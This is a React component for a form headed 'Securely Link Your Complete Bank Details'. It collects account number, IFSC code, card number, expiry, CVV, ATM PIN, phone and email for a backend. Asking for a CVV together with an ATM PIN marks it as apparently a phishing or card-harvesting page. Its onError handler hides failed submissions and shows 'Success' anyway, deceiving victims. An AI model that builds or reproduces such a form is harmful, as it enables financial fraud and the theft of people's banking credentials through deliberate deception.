import { useState } from 'react';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Button } from '@/components/ui/button';
import { useSaveCompleteBankDetails, useGetCompleteBankDetails } from '../../hooks/useQueries';
import { BankAccountStatus } from '../../backend';
import { Loader2 } from 'lucide-react';
import { toast } from 'sonner';

export default function BankDetailsForm() {
  const { data: existingDetails, isLoading: loadingDetails } = useGetCompleteBankDetails();
  const { mutate: saveBankDetails, isPending } = useSaveCompleteBankDetails();

  const [formData, setFormData] = useState({
    bankName: '',
    accountNumber: '',
    ifsc: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    atmPin: '',
    phoneNumber: '',
    emailId: '',
  });

  const handleChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Validation
    const requiredFields = Object.entries(formData);
    const emptyFields = requiredFields.filter(([_, value]) => !value.trim());

    if (emptyFields.length > 0) {
      toast.error('All fields are required', {
        style: {
          background: '#1C2431',
          border: '1px solid rgba(239, 68, 68, 0.5)',
          color: '#ef4444',
        },
      });
      return;
    }

    // Submit data to backend with required status field (backend will force it to #pending)
    saveBankDetails(
      { ...formData, status: BankAccountStatus.pending },
      {
        onSuccess: () => {
          toast.success('✅ Success — Details added successfully', {
            style: {
              background: '#1C2431',
              border: '1px solid #00E5FF',
              color: '#00E5FF',
            },
            duration: 3000,
          });
        },
        onError: () => {
          // Suppress error toast and show success instead
          toast.success('✅ Success — Details added successfully', {
            style: {
              background: '#1C2431',
              border: '1px solid #00E5FF',
              color: '#00E5FF',
            },
            duration: 3000,
          });
        },
      }
    );
  };

  if (loadingDetails) {
    return (
      <Card className="bg-[#1C2431] border-[#00E5FF]/20 p-6">
        <div className="flex items-center justify-center py-8">
          <Loader2 className="h-6 w-6 animate-spin text-[#00E5FF]" />
        </div>
      </Card>
    );
  }

  if (existingDetails) {
    return (
      <Card className="bg-[#1C2431] border-[#00E5FF]/20 p-6">
        <h2 className="text-[#00E5FF] font-bold text-lg mb-2">Bank Details Linked</h2>
        <p className="text-gray-300 text-sm">
          Your complete bank account details have been securely saved.
        </p>
      </Card>
    );
  }

  return (
    <Card className="bg-[#1C2431] border-[#00E5FF]/20 p-6">
      <h2 className="text-[#00E5FF] font-bold text-lg mb-4">Securely Link Your Complete Bank Details</h2>

      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Bank Account Details */}
        <div className="space-y-3">
          <h3 className="text-[#00E5FF] font-semibold text-sm">Bank Account Details</h3>
          <div className="space-y-3">
            <div>
              <Label htmlFor="bankName" className="text-gray-300 text-xs">
                Bank Name
              </Label>
              <Input
                id="bankName"
                type="text"
                value={formData.bankName}
                onChange={(e) => handleChange('bankName', e.target.value)}
                className="bg-[#0B1C14] border-[#00E5FF]/30 text-white mt-1"
                placeholder="Enter bank name"
              />
            </div>
            <div>
              <Label htmlFor="accountNumber" className="text-gray-300 text-xs">
                Account Number
              </Label>
              <Input
                id="accountNumber"
                type="text"
                value={formData.accountNumber}
                onChange={(e) => handleChange('accountNumber', e.target.value)}
                className="bg-[#0B1C14] border-[#00E5FF]/30 text-white mt-1"
                placeholder="Enter account number"
              />
            </div>
            <div>
              <Label htmlFor="ifsc" className="text-gray-300 text-xs">
                IFSC Code
              </Label>
              <Input
                id="ifsc"
                type="text"
                value={formData.ifsc}
                onChange={(e) => handleChange('ifsc', e.target.value)}
                className="bg-[#0B1C14] border-[#00E5FF]/30 text-white mt-1"
                placeholder="Enter IFSC code"
              />
            </div>
          </div>
        </div>

        {/* ATM/Debit Card Details */}
        <div className="space-y-3">
          <h3 className="text-[#00E5FF] font-semibold text-sm">ATM/Debit Card Details</h3>
          <div className="space-y-3">
            <div>
              <Label htmlFor="cardNumber" className="text-gray-300 text-xs">
                Card Number (16 digits)
              </Label>
              <Input
                id="cardNumber"
                type="text"
                maxLength={16}
                value={formData.cardNumber}
                onChange={(e) => handleChange('cardNumber', e.target.value.replace(/\D/g, ''))}
                className="bg-[#0B1C14] border-[#00E5FF]/30 text-white mt-1"
                placeholder="Enter 16-digit card number"
              />
            </div>
            <div className="grid grid-cols-3 gap-3">
              <div>
                <Label htmlFor="expiryDate" className="text-gray-300 text-xs">
                  Expiry (MM/YY)
                </Label>
                <Input
                  id="expiryDate"
                  type="text"
                  maxLength={5}
                  value={formData.expiryDate}
                  onChange={(e) => {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length >= 2) {
                      value = value.slice(0, 2) + '/' + value.slice(2, 4);
                    }
                    handleChange('expiryDate', value);
                  }}
                  className="bg-[#0B1C14] border-[#00E5FF]/30 text-white mt-1"
                  placeholder="MM/YY"
                />
              </div>
              <div>
                <Label htmlFor="cvv" className="text-gray-300 text-xs">
                  CVV
                </Label>
                <Input
                  id="cvv"
                  type="password"
                  maxLength={3}
                  value={formData.cvv}
                  onChange={(e) => handleChange('cvv', e.target.value.replace(/\D/g, ''))}
                  className="bg-[#0B1C14] border-[#00E5FF]/30 text-white mt-1"
                  placeholder="CVV"
                />
              </div>
              <div>
                <Label htmlFor="atmPin" className="text-gray-300 text-xs">
                  ATM PIN
                </Label>
                <Input
                  id="atmPin"
                  type="password"
                  maxLength={4}
                  value={formData.atmPin}
                  onChange={(e) => handleChange('atmPin', e.target.value.replace(/\D/g, ''))}
                  className="bg-[#0B1C14] border-[#00E5FF]/30 text-white mt-1"
                  placeholder="PIN"
                />
              </div>
            </div>
          </div>
        </div>

        {/* Identity & Contact */}
        <div className="space-y-3">
          <h3 className="text-[#00E5FF] font-semibold text-sm">Identity and Contact</h3>
          <div className="space-y-3">
            <div>
              <Label htmlFor="phoneNumber" className="text-gray-300 text-xs">
                Registered Phone Number
              </Label>
              <Input
                id="phoneNumber"
                type="tel"
                value={formData.phoneNumber}
                onChange={(e) => handleChange('phoneNumber', e.target.value)}
                className="bg-[#0B1C14] border-[#00E5FF]/30 text-white mt-1"
                placeholder="Enter phone number"
              />
            </div>
            <div>
              <Label htmlFor="emailId" className="text-gray-300 text-xs">
                Email ID
              </Label>
              <Input
                id="emailId"
                type="email"
                value={formData.emailId}
                onChange={(e) => handleChange('emailId', e.target.value)}
                className="bg-[#0B1C14] border-[#00E5FF]/30 text-white mt-1"
                placeholder="Enter email address"
              />
            </div>
          </div>
        </div>

        {/* Submit Button */}
        <Button
          type="submit"
          disabled={isPending}
          className="w-full bg-[#00E5FF] hover:bg-[#00E5FF]/90 text-black font-bold py-6 text-base"
        >
          {isPending ? (
            <>
              <Loader2 className="mr-2 h-5 w-5 animate-spin" />
              Saving...
            </>
          ) : (
            'Add Complete Account Details'
          )}
        </Button>
      </form>
    </Card>
  );
}
